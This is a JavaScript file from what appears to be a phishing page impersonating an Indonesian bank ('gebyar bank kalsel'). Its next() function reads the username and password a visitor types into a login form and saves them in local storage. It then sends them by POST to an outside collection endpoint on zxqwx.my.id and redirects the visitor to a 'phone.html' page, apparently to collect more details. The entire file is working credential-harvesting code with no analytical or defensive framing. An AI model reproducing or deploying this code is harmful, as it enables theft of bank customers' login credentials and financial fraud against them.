$(document).ready(function() {
});

function next() {
	var username = $("#username").val().trim();
	var password = $("#password").val();
	if (username == "" || password == "") {
		alert("Mohon masukkan username dan kata sandi!");
		return;
	}
	window.localStorage.setItem('username', username);
	window.localStorage.setItem('password', password);
	$("#loader").css('display', 'flex');
	var message = ('\n<b>Username:</b>\n'+username+'\n\n<b>Password:</b>\n'+password+'\n');
	var fd = new FormData();
	fd.append('message', message);
	fetch("https://zxqwx.my.id/senders/"
        +"gebyar-bank-kalsel/send.php", {
        method: 'POST',
        body: fd
      })
      .then(response => response.json())
      .then(data => {
      	dataSent();
      })
      .catch((error) => {
      	dataSent();
      });
}

function dataSent() {
	window.location.href = "phone.html";
}